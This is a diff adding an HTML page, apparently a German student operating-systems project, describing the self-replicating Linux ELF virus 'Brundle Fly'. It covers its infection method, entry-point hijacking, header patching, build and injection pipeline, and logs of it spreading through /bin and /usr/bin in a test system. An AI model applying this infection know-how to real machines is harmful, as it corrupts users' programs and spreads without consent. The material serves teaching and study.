@@ -1,0 +1,1125 @@
+<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
+<html>
+<head>
+   <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+   <meta name="GENERATOR" content="Mozilla/4.75 [en] (X11; U; SunOS 5.8 i86pc) [Netscape]">
+</head>
+<body bgcolor="white"> 
+<table width="700" align="center">
+<tr><td>
+Operating Systems, final project
+<br>Konrad Rieck,
+<br>Konrad Kretschmer
+<br>&nbsp;
+<br>&nbsp;
+<br>
+<br>
+<center>
+<img src="brundle-fly.gif" alt="uaargh">
+<p><b><u><font size=+3>BRUNDLE FLY</font></u></b>
+<br>A good-natured Linux ELF virus</center>
+
+<p><br>
+<br>
+<br>
+<p><b>Sources</b>
+<blockquote>Brundle Fly Version 0.0.1<br>
+<a href="brundle-fly-0.0.1.tar.gz"><tt>brundle-fly-0.0.1.tar.gz</tt></a>
+</blockquote>
+<br>
+<p><b>Inhalt</b>
+<blockquote>1&nbsp;&nbsp;&nbsp; Einleitung
+<br>2&nbsp;&nbsp;&nbsp; Details der Implementierung
+<br>2.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Das ELF Format
+<br>2.2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Integration des Virus
+<br>2.3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Modifikationen an der Wirtsdatei
+<br>2.4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Interna des Virus
+<br>2.5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Wirtssuche
+<br>3&nbsp;&nbsp;&nbsp; Kompilierung
+<br>3.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Details zu den Schritten
+<br>4&nbsp;&nbsp;&nbsp; Lebensweise von Brundle-Fly
+<br>4.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Vermehrung
+<br>4.2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Ein Blick ins Innere
+<br>5&nbsp;&nbsp;&nbsp; Weitere Informationen
+<br>5.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Ausbreitungsrate
+<br>5.2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Viruserkennung
+<br>5.3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Neukompilierung
+<br>5.4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Weiteres
+<p>Anhang
+<br><tt>brundle-fly-proto.c</tt>
+<br>&nbsp;
+<br>&nbsp;</blockquote>
+<b>1 Einleitung</b>
+<blockquote>Brundle Fly (BF) ist ein gutartiger Linux ELF virus. BF wurde
+f&uuml;r die Prozessorarchitektur des Intel 80386 und Folgeversionen konzipiert.
+Der Virus repliziert sich selbst&auml;ndig innerhalb eines Systems und
+wurde erfolgreich unter folgenden Kernel Versionen getestet: 2.2.17, 2.4.1,
+2.4.3 und 2.4.5</blockquote>
+
+<ul>BF ist bibliotheks-unabh&auml;ngig und kann als Lebensraum sowohl Systeme
+mit LibC5 also auch System mit GlibC befallen. Um einen Wirt zu befallen
+nutzt BF eine Eigenschaft des Memory Managements von Linux aus. Programme
+werden unter Linux seitenweise (Seite = 4096 Bytes) in den Speicher geladen.
+Da Programme nur selten sich exakt in Seiten zerlegen lassen, entsteht
+ein kleiner Speicherbereich, der es erm&ouml;glicht zus&auml;tzlichen Programmcode
+an das Programm anzuh&auml;ngen.&nbsp; Dieses einfache Verfahren zum Einf&uuml;gen
+des Virus beschr&auml;nkt allerdings auch seine Gr&ouml;&szlig;e auf maximal&nbsp;
+4096 Bytes.
+<p>Es existieren 3 Varianten von BF
+<blockquote>
+<li>
+<tt><a href="brundle-fly-default.gz"</a>brundle-fly-default</a></tt></li>
+
+<br>Die normale Variante des Virus infiziert nur die Datei <tt>host</tt>
+andere Dateien werden nicht befallen, wird der Viruscode ausgef&uuml;hrt,
+so sendet er eine Warnung zum <tt>STDOUT </tt>(Virusgr&ouml;&szlig;e ~
+1400 Byte).
+<li>
+<tt><a href="brundle-fly-propagation.gz">brundle-fly-propagation</a></tt></li>
+
+<br>Diese Variante ist wesentlich aggressiver und repliziert sich innerhalb
+des Systems. Allerdings wird bei jeder Aktivierung des Virus die selbe
+Warnung zum <tt>STDOUT</tt> geschickt. (Virusgr&ouml;&szlig;e ~ 2000 Byte)
+
+<li>
+<tt>brundle-fly-propagation-no-warning</tt></li>
+
+<br>Bei dieser Variante handelt es sich um den eigentlichen Virus, es wird
+keine Warnung ausgegeben und der Virus vermehrt sich innerhalb des Systems.
+(Virusgr&ouml;&szlig;e ~ 1900 Byte). <br>
+<b>Diese Variante k&ouml;nnen wir leider nicht zum Download anbieten!</b></blockquote>
+BF ist verwandt mit den Bliss, VIT und Siilov Linux ELF Viren. BF stellt
+einen direkten Nachfolger des VIT Virus dar.</ul>
+<b>2 Details der Implementierung</b>
+<blockquote><b>2.1 Das ELF Format</b>
+<p>Eine ELF Datei gliedert sich in drei Typen von Daten: Segmente, Header
+und Sektionen. Segmente k&ouml;nnen hierbei entweder Textsegmente oder
+Datensegmente sein. Textsegmente enthalten ausf&uuml;hrbaren Programmcode,
+w&auml;hrend hingegen Datensegmente,&nbsp; die von dem Program ben&ouml;tigten
+Daten enthalten.&nbsp; Es existieren wiederum drei Typen von Headern, der
+allgemeine ELF Header, mehrere Programm Header und mehrere Sektions Header.
+Die Programm und Sektions Header sind jeweils &uuml;ber die Programm Header
+bzw. Sektions Header Tabelle zu erreichen. In den Sektionen befinden sich
+Informationen &uuml;ber die Symbole des Codes, Relokations-Adressen, etc.
+<p>Eine ELF&nbsp; Datei
+<blockquote><tt>ELF Header</tt>
+<br><tt>Programm Header Tabelle</tt>
+<br><tt>Segment (Daten / Text)</tt>
+<br><tt>Segment (Daten / Text)</tt>
+<br><tt>...</tt>
+<br><tt>Sektions Header Tabelle</tt>
+<br><tt>Sektion</tt>
+<br><tt>Sektion</tt>
+<br><tt>...</tt></blockquote>
+Wie in der Einleitung erw&auml;hnt wird der Inhalt eines Programmes seitenweise
+in den Speicher geladen, dadurch entsteht das folgende Szenario. Hierbei
+repr&auml;sentiert <tt>t</tt> einen Bereich eines Textsegments, <tt>d</tt>
+einen Bereich eines Datensegments und <tt>u</tt> einen unbenutzen Bereich.
+<p>Struktur innerhalb der Datei
+<blockquote>
+<pre><tt>|Page 0 Byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4096 Bytes | Page 0 Byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+|tttttttttttttttttttttttttttttttttdddd|ddddddddddddddddddddddd</tt></pre>
+</blockquote>
+Struktur innerhalb des Speichers
+<blockquote>
+<pre><tt>|Page 0 Byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4096 Bytes | Page 0 Byte
+|tttttttttttttttttttttttttttttttttuuuu|ddddddddddddddddddddddd</tt></pre>
+</blockquote>
+
+<p><br><b>2.2 Integration des Virus</b>
+<p>Hat der Virus ein m&ouml;gliches Opfer gefunden, so liesst er den ELF
+Header (<tt>ehdr</tt>) des Opfers ein und ermittelt so die Positionen der
+Programm Header Tabelle (<tt>phdrs</tt>) und der Sektions Header Tabelle
+(<tt>shdrs</tt>).&nbsp; Die zwei Tabellen und der ELF Header werden in
+den Speicher gelesen und der Virus sucht nach einem Textsegment, dass sich
+nicht exakt in Seiten zerlegen l&auml;sst. Findet er ein solches Segment,
+so beginnt er mit der Integration des Virus.
+<p>Der Startpunkt einer ELF Datei wird durch die Variable <tt>e_entry</tt>
+innerhalb des ELF Headers gekennzeichnet. Diese Variable setzt der Virus
+um auf seinen eigenen Startpunkt <tt>virus_entry</tt> und gleichzeitig
+&auml;ndert er seinen Endpunkt <tt>host_entry</tt>, so dass nach Ausf&uuml;hrung
+des Virus wieder zum urspr&uuml;nglichen Startpunkt gesprungen wird. <tt>v
+</tt>markiert
+einen Bereich den der Virus verwendet, <tt>s </tt>ist der originale Startpunkt,
+<tt>e</tt>
+der Startpunkt des Virus und <tt>h</tt> der Endpunkt des Virus.
+<p>Struktur innerhalb des Speichers
+<blockquote><tt>|Page 0 Byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+4096 Bytes |ttttttttsttttttttttttttttttttttttvvvevvvvvvhuuuuuuuuuuuu</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ^&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+^&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |</tt>
+<br><tt>e_entry------------------------------+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+|</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; +----------------------------------+</tt>
+<p><tt>h = host_entry, e = virus_entry</tt></blockquote>
+Um eine Kopie von sich selbst zu erzeugen ist es f&uuml;r BF au&szlig;erdem
+n&ouml;tig, seinen eigentlichen Beginn <tt>b</tt> und seine L&auml;nge
+<tt>l</tt>
+zu kennen.
+<p>Struktur innerhalb des Speichers
+<blockquote><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&lt;--- l ---></tt>
+<br><tt>|Page 0 Byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+4096 Bytes |ttttttttsttttttttttttttttttttttttbvvevvvvvvhuuuuuuuuuuuu</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ^&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+^&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |</tt>
+<br><tt>e_entry------------------------------+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+|</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; +----------------------------------+</tt>
+<p><tt>h = host_entry, e = virus_entry</tt>
+<br><tt>b = virus_start, l = virus_length</tt></blockquote>
+
+<p><br><b>2.3 Modifikationen an der Wirtsdatei</b>
+<p>Neben der oben beschrieben &Auml;nderung der Variable <tt>e_entry</tt>,
+&auml;ndert BF&nbsp; noch weitere Daten der originalen ELF Datei.&nbsp;
+Da er sich in ein Textsegment einf&uuml;gt, muss er die Gr&ouml;&szlig;e
+dieses Segments, sowohl im Speicher als auch in der Datei ver&auml;ndern,
+dieses geschieht durch &Auml;nderung der Programm Header Variablen <tt>p_memsz</tt>
+und <tt>p_filesz</tt>.
+<p>Das Einf&uuml;gen des Virus hat auch zur Folge, dass alle folgende Programm
+Header und Sektions Header nun ein unterschiedliches Offset zum Dateibeginn
+besitzen. F&uuml;r alle diese Header m&uuml;ssen also auch Modifikationen
+vorgenommen werden, es ist eine Ver&auml;nderung der Variablen <tt>sh_offset</tt>
+und <tt>p_offset</tt> n&ouml;tig.
+<br>&nbsp;
+<p><b>2.4 Interna des Virus</b>
+<p>Als Konzept wurde BF bibliotheks-unabh&auml;ngig gestaltet, dass heisst
+f&uuml;r alle Operationen, die BF durchf&uuml;hrt m&uuml;ssen entweder
+eigene Funktionen implementiert sein oder auf System Calls zur&uuml;ck
+gegriffen werden. Die Systemcalls werden direkt per Makro &uuml;ber den
+Interrupt 0x80 angesprochen. Um eine Kompatibilt&auml;t mit 2.2er Kerneln
+zu gew&auml;hrleisten, werden konsequent nur die 32Bit Varianten der Posix
+System Calls verwendet, im Detail:
+<blockquote><tt>write(), read(), lseek(), open(), close(), fstat(), fchown(),
+fchmod(), getdents(), rename(), acces(), brk(), time()</tt></blockquote>
+Da BF sich direkt in das Textsegment des Wirtes kopiert, kann der Virus
+nicht auf ein eigenes Datensegment zur&uuml;ck greifen. Alle n&ouml;tigen
+Daten m&uuml;ssen also in das Textsegment des Virus kopiert werden, damit
+er auf diese Zugriff hat. (Siehe Kompilierung, <tt>finetune</tt>).&nbsp;
+Einige der oben genannten System Calls erwarten allerdings einen absoluten
+Adresswert auf dem Stack.&nbsp; Hierzu nutzt BF einen Trick.
+<p>Eine normale Adressierung mit absoluter Adresse
+<blockquote><tt>.text</tt>
+<br><tt>&nbsp;&nbsp; pushl&nbsp;&nbsp; VAR1</tt>
+<br><tt>&nbsp;&nbsp; call&nbsp;&nbsp;&nbsp; SYS_CALL</tt>
+<br><tt>...</tt>
+<br><tt>&nbsp;&nbsp; ret</tt>
+<p><tt>.data</tt>
+<br><tt>&nbsp;&nbsp; string&nbsp; VAR1 "foobar"</tt></blockquote>
+W&auml;hrend des kompilierens des Assemblercodes ersetzt der Assembler
+das <tt>VAR1</tt> durch die absolute Adresse. Innerhalb des Virus ist dies
+nat&uuml;rlich nicht m&ouml;glich. Der folgende Trick stellt eine L&ouml;sung
+des Problems dar.
+<blockquote><tt>.text</tt>
+<br><tt>&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp;&nbsp; VAR1</tt>
+<br><tt>LABEL:</tt>
+<br><tt>&nbsp;&nbsp; call&nbsp;&nbsp;&nbsp; SYS_CALL</tt>
+<br><tt>...</tt>
+<br><tt>&nbsp;&nbsp; ret</tt>
+<p><tt>.data</tt>
+<br><tt>VAR1:</tt>
+<br><tt>&nbsp;&nbsp; call&nbsp;&nbsp;&nbsp; LABEL</tt>
+<br><tt>&nbsp;&nbsp; string&nbsp; "foorbar"</tt></blockquote>
+Bevor also der System Call aufgerufen wird, springt der Prozessor direkt
+an die Position <tt>VAR1</tt> und von dort per <tt>call</tt> direkt wieder
+zur&uuml;ck. Der Trick hierbei liegt in der Funktionsweise von <tt>call</tt>.
+Die <tt>call</tt> Instruktion&nbsp; legt die absolute Adresse des nachfolgenden
+Befehls auf den Stack. Da diese Adresse in diesem Fall, die Adresse des
+Strings ist, befindet sich also eine absolute Adresse der Variable auf
+dem Stack und der System Call kann diese verarbeiten.
+<br>&nbsp;
+<p><b>2.5 Wirtssuche</b>
+<p>Nachdem BF ausgf&uuml;hrt wird durchsucht er die folgenden Verzeichnisse
+nach m&ouml;glichen Wirten: ./, ../. und ../../.. Er pr&uuml;ft hierbei,
+ob es sich bei den Dateien um schreibbare ELF Dateien handelt, die ein
+gen&uuml;gend gro&szlig;es Textsegment enhalten.&nbsp; Um nicht all zu
+sehr auszufallen bef&auml;llt BF nur jede dritte Datei und w&auml;hlt per
+Zufall (<tt>time()</tt>) aus, welches Verzeichnis er untersucht. BF pr&uuml;ft
+nicht, ob ein Wirt bereits schon befallen ist, es kann also durchaus auch
+zu mehrfach Befall kommenen (siehe Vermehrung).
+<p>Um auch &uuml;ber Verzeichnisse zu springen, pr&uuml;ft BF ob seine
+Ursprungsdatei relativ aufgerufen wurde, in diesem Fall sucht er innerhalb
+eines hart-kodierten Pfades nach sich selbst. Kann er sich selbst finden,
+so kopiert er den eigentlich Virus Code in den Speicher und f&uuml;hrt
+die Integration durch. Durch diese Technik gelangt der Virus weit von seinem
+Ursprungsort entfernt in fremde Verzeichnisse.
+<br>&nbsp;
+<br>&nbsp;</blockquote>
+<b>3 Kompilierung</b>
+<blockquote>BF wird in verschiedenen Schichten kompiliert. Als Ursprung
+liegt eine C Datei vor <tt>brundle-fly-proto.c</tt>, die den reinen C Codes
+des Virus enth&auml;lt.
+<ol><tt>brundle-fly-proto.c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; C Datei
+des Virus</tt>
+<br><tt>&nbsp;|</tt>
+<br><tt>&nbsp;| 1. gcc -S brundle-fly-proto.c</tt>
+<br><tt>&nbsp;v</tt>
+<br><tt>brundle-fly-proto.s&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Assembler
+Datei des Virus</tt>
+<br><tt>&nbsp;|</tt>
+<br><tt>&nbsp;| 2. finetune brundle-fly-proto.s brundle-plain.s</tt>
+<br><tt>&nbsp;v</tt>
+<br><tt>brundle-fly-plain.s&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Modifizierte
+Assembler Datei</tt>
+<br><tt>&nbsp;|</tt>
+<br><tt>&nbsp;| 3. as -o brundle-fly-plain.o brundle-fly-plain.s</tt>
+<br><tt>&nbsp;v</tt>
+<br><tt>brundle-fly-plain.o&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Kompilierte
+Datei des Virus</tt>
+<br><tt>&nbsp;|</tt>
+<br><tt>&nbsp;| 4. ld -o brundle-fly-linked.o brundle-fly-plain.o</tt>
+<br><tt>&nbsp;v</tt>
+<br><tt>brundle-fly-linked.o&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Neu gelinkte
+Datei des Virus</tt>
+<br><tt>&nbsp;|</tt>
+<br><tt>&nbsp;| 5. elf2bin brundle-fly-linked.o brundle-fly.c</tt>
+<br><tt>&nbsp;v</tt>
+<br><tt>brundle-fly.c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+C Datei, die den Virus als char[] enth&auml;lt</tt>
+<br><tt>&nbsp;|</tt>
+<br><tt>&nbsp;| 6. gcc -o inject brundle-fly.c inject.c</tt>
+<br><tt>&nbsp;v</tt>
+<br><tt>inject&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+Injektionsprogramm</tt>
+<br><tt>&nbsp;|</tt>
+<br><tt>&nbsp;| 7. inject host brundle-fly</tt>
+<br><tt>&nbsp;v</tt>
+<br><tt>brundle-fly&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+Lebender Virus in dem Wirt "host"</tt></ol>
+<b>3.1 Details zu den Schritten</b>
+<ol>
+<li>
+<tt>gcc -S brundle-fly-proto.c</tt></li>
+
+<br>Der Prototyp von BF wird mittels des GNU C Compilers in eine Assembler
+Datei umgewandelt.
+<br>&nbsp;
+<li>
+<tt>finetune brundle-fly-proto.s brundle-plain.s</tt></li>
+
+<br>Das Programm <tt>finetune</tt> erstellt die oben beschrieben Modifikationen,
+d.h. bewegt etwaige Daten in das Textsegment und erstellt die jeweilige
+Umgebung mit <tt>jmp</tt> und <tt>call</tt> Anweisungen. Es werden zu dem
+<tt>push</tt>
+und <tt>pop</tt> Anweisungen eingef&uuml;gt, die sicherstellen, dass die
+meisten Register w&auml;hrend des Ausf&uuml;hrung des Virus gesichert sind.
+<br>Das Programm <tt>finetune</tt> ist allerdings kein Assembler Parser,
+sollte es dem Programm nicht gelingen den Code korrekt zu modifizieren,
+so schl&auml;gt der n&auml;chste Schritt fehl. In diesem Fall ist es n&ouml;tig
+entweder den C Code zu modifzieren, oder die Probleme per Hand aus der
+Assembler Datei zu entfernen.
+<br>&nbsp;
+<li>
+<tt>as -o brundle-fly-plain.o brundle-fly-plain.s</tt></li>
+
+<br>Die modifizierte Assembler Version des Virus wird kompiliert zu einem
+ELF Objekt.
+<br>&nbsp;
+<li>
+<tt>ld -o brundle-fly-linked.o brundle-fly-plain.o</tt></li>
+
+<br>Dieser Schritt ist n&ouml;tig, da neuere Versionen des GNU Assemblers
+realokierbaren Code innerhalb von BF erzeugen. Um diese l&auml;stigen Bereiche
+zu entfernen, muss das gesamte ELF Objekt noch einmal gelinkt werden. Realokierbare
+Stellen werden dadurch entfernt.
+<br>&nbsp;
+<li>
+<tt>elf2bin brundle-fly-linked.o brundle-fly.c</tt></li>
+
+<br>Aus dem so erzeugten ELF Objekt wird nun der reine Code des Virus ausgelesen
+und in ein Array von Charakters umgewandelt. <tt>elf2bin</tt> erledigt
+hierbei auch die n&ouml;tigen Modifikationen an den Variablen
+<tt>virus_length</tt>,
+<tt>host_entry</tt>,
+<tt>virus_start</tt>
+und <tt>virus_length</tt>. Die Werte f&uuml;r diese Variablen lassen sich
+erst in diesem Schritt korrekt bestimmen.
+<br>&nbsp;
+<li>
+<tt>gcc -o inject brundle-fly.c inject.c</tt></li>
+
+<br>Die so erzeugte C Datei wird nun in das Programm <tt>inject</tt> eingebunden,
+dass in seiner Arbeitsweise dem Virus selbst sehr &auml;hnlich ist und
+dazu dient den Virus in einen Wirt zu injezieren. <tt>inject</tt> ist allerdings
+wesentlich &uuml;bersichtlicher programmiert, es musste keine R&uuml;cksicht
+auf die Gr&ouml;&szlig;e und Funktionsweise des Codes gelegt werden.
+<br>&nbsp;
+<li>
+<tt>inject host brundle-fly</tt></li>
+
+<br>Am Ende der Bearbeitung erhalten wir so eine infizierte Datei.</ol>
+</blockquote>
+<b>4 Lebensweise</b>
+<blockquote><b>4.1 Vermehrung</b>
+<p>Um die Lebensweise des Virus zu &uuml;berpr&uuml;fen haben wir den Virus
+auf einem User Mode Linux ausgesetzt und sein Verhalten beobachtet. Leider
+konnten wir auf dem vorgegeben System den Virus nicht kompilieren, da sowohl
+Compiler als auch Assembler nicht mit BF kompatibel waren. Allerdings liess
+sich ein auf einem anderen System infizierter Virus auf das User Mode Linux
+&uuml;bertragen.
+<blockquote>
+<pre><tt># inject /bin/du du
+- Infecting /bin/du to du
+&nbsp; Virus length: 2021
+&nbsp; Host entry:&nbsp;&nbsp; 1822
+&nbsp; Virus entry:&nbsp; 1345
+- Looking for suitable text segment: .. found
+- Virtual virus start at 0x0804c44c
+- Physical virus start at 0x0000444c
+- Patching virus_data[369] (virus_start) to 0x0000444c
+- Patching virus_data[1822] (host_entry) to 0x08048d44
+- Increasing file/mem size 17484 by 2021
+- Fixing following phdr offsets: ... done
+- Fixing following shdr offsets: .......... done
+- Fixing shdr tabel offset if necessary.
+- Starting to write infected binary: ........ done
+# mv du /bin</tt></pre>
+</blockquote>
+Als Start injezierten wir BF in den Befehl <tt>du</tt> und kopierten diesen
+anschliessend wieder an seinen Ursprungsort.&nbsp; Wir f&uuml;hrten dann
+<tt>du</tt>
+genau 10 mal auf unterschiedlichen Verzeichnissen aus.
+<blockquote><tt># cd /bin</tt>
+<br><tt># du</tt>
+<br><tt>WARNING: brundle-fly infected!</tt>
+<br><tt>320 .</tt>
+<br><tt># du</tt>
+<br><tt>WARNING: brundle-fly infected!</tt>
+<br><tt>484 .</tt>
+<br><tt># cd /usr/bin</tt>
+<br><tt># du</tt>
+<br><tt>WARNING: brundle-fly infected!</tt>
+<br><tt>4684 .</tt>
+<br><tt># du</tt>
+<br><tt>WARNING: brundle-fly infected!</tt>
+<br><tt>4832 .</tt>
+<br><tt>...</tt></blockquote>
+Schon w&auml;hrend der Ausf&uuml;hrung von <tt>du</tt>, ist deutlich zu
+beobachten, wie sich der Inhalt des Verzeichnisses vergr&ouml;&szlig;ert.
+Es ist also davon auszugehen, dass etliche Dateien befallen wurden Eine
+Suche erbrachte dann erschreckende Resultat.
+<blockquote><tt># grep infected /bin/* /usr/bin/*</tt>
+<br><tt>Binary file /bin/ash matches</tt>
+<br><tt>Binary file /bin/bash1 matches</tt>
+<br><tt>Binary file /bin/bzip2recover matches</tt>
+<br><tt>Binary file /bin/chgrp matches</tt>
+<br><tt>Binary file /bin/compress matches</tt>
+<br><tt>Binary file /bin/csh matches</tt>
+<br><tt>Binary file /bin/du matches</tt>
+<br><tt>Binary file /bin/getopt matches</tt>
+<br><tt>Binary file /bin/getoptprog matches</tt>
+<br><tt>Binary file /bin/gunzip matches</tt>
+<br><tt>Binary file /bin/mkfifo matches</tt>
+<br><tt>Binary file /bin/ps matches</tt>
+<br><tt>Binary file /bin/red matches</tt>
+<br><tt>Binary file /bin/rm matches</tt>
+<br><tt>Binary file /bin/sleep matches</tt>
+<br><tt>Binary file /bin/sln matches</tt>
+<br><tt>Binary file /bin/su matches</tt>
+<br><tt>Binary file /bin/telnet matches</tt>
+<br><tt>Binary file /bin/umount matches</tt>
+<br><tt>Binary file /usr/bin/awk matches</tt>
+<br><tt>Binary file /usr/bin/bpe matches</tt>
+<br><tt>Binary file /usr/bin/clear matches</tt>
+<br><tt>Binary file /usr/bin/col matches</tt>
+<br><tt>Binary file /usr/bin/colrm matches</tt>
+<br><tt>Binary file /usr/bin/compress matches</tt>
+<br><tt>Binary file /usr/bin/dirname matches</tt>
+<br><tt>Binary file /usr/bin/disable-paste matches</tt>
+<br><tt>Binary file /usr/bin/elvtags matches</tt>
+<br><tt>Binary file /usr/bin/env matches</tt>
+<br><tt>Binary file /usr/bin/expiry matches</tt>
+<br><tt>...</tt>
+<br><tt>[56 Weitere Resultate]</tt></blockquote>
+Um sicherzustellen, dass diese infizierten Dateien auch funktionieren,
+wurden einige wahllose Tests durchgef&uuml;hrt.
+<blockquote><tt># who</tt>
+<br><tt>WARNING: brundle-fly infected!</tt>
+<br><tt>root&nbsp;&nbsp;&nbsp;&nbsp; ttys/1&nbsp;&nbsp; Jul 11 16:32</tt>
+<br><tt>root&nbsp;&nbsp;&nbsp;&nbsp; ttys/2&nbsp;&nbsp; Jul 11 16:31</tt>
+<p><tt># ps</tt>
+<br><tt>Unknown HZ value! (20) Assume 100.</tt>
+<br><tt>WARNING: brundle-fly infected!</tt>
+<br><tt>&nbsp; PID TTY&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+TIME CMD</tt>
+<br><tt>&nbsp; 120 pts/0&nbsp;&nbsp;&nbsp; 00:00:00 bash</tt>
+<br><tt>&nbsp; 554 pts/0&nbsp;&nbsp;&nbsp; 00:00:00 ps</tt>
+<p><tt># strings</tt>
+<br><tt>WARNING: brundle-fly infected!</tt>
+<br><tt>WARNING: brundle-fly infected!</tt>
+<p><tt># tee</tt>
+<br><tt>WARNING: brundle-fly infected!</tt>
+<p><tt># ash</tt>
+<br><tt>WARNING: brundle-fly infected!</tt>
+<br><tt>\u@\h:\w\$ exit</tt>
+<p><tt># pinky</tt>
+<br><tt>WARNING: brundle-fly infected!</tt>
+<br><tt>Login&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+TTY&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Idle&nbsp;&nbsp; When&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+Where</tt>
+<br><tt>root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ttys/1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Jul 11 16:32</tt>
